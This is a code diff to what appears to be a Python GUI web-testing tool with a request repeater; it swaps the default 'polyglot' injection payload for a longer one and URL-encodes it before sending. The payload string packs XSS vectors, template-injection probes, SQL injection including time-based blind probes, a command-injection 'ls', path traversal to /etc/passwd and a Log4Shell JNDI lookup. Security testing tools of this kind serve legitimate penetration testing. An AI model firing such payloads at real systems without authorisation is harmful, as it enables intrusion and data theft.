@@ -54,12 +54,7 @@ logger = logging.getLogger(__name__)
 # Default polyglot payload (configurable via Tools → Set Polyglot Payload)
 # ─────────────────────────────────────────────────────────────────────────────
 _DEFAULT_POLYGLOT = (
-    "'\"><script>alert(\u0049nj3ct3d)</script>"
-    "{{7*7}}${7*7}<%=7*7%>"
-    "' OR '1'='1'-- "
-    "; ls -la #"
-    "/../../../etc/passwd"
-    "${jndi:ldap://127.0.0.1/x}"
+    "'\"><script>alert(Inj3ct3d)</script>{{7*7}}${7*7}<%=7*7%>' OR '1'='1'-- ; ls -la #/../../../../../../etc/passwd${jndi:ldap://127.0.0.1/x}JavaScript://%250Aalert?.(1)//'/*\\'/*\\\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\\76-->IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\""
 )
 
 _ENV_SUBDOMAIN_PREFIXES = [
@@ -7856,7 +7851,7 @@ class RepeaterInstance(QWidget):
             gs = getattr(self.window(), "_global_settings", {}) or {}
         except Exception:
             gs = {}
-        payload = gs.get("polyglot_payload", _DEFAULT_POLYGLOT)
+        payload = urllib.parse.quote(gs.get("polyglot_payload", _DEFAULT_POLYGLOT), safe='')
         cursor.insertText(payload)
         self.request_editor.setTextCursor(cursor)
         self._send_request()
